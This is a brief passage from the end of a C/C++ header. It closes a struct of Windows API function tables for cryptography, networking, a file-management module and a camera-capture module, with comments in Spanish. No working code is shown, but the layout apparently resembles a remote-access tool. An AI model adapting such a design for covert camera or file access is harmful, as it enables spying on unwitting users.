		st_Bcrypt     BCRYPT;
		st_Crypt32   CRYPT32;
		st_Netapi32 NETAPI32;

		//AdmArchivos
		st_Kernel32_FM KERNEL32_FM;

		//Mod camara
		st_Shlwapi SHLWAPI;
		st_Mfplat MFPLAT;
		st_Mf MF;
		st_Mfapi MFAPI;
		st_Mfreadwrite MFREADWRITE;
};

#endif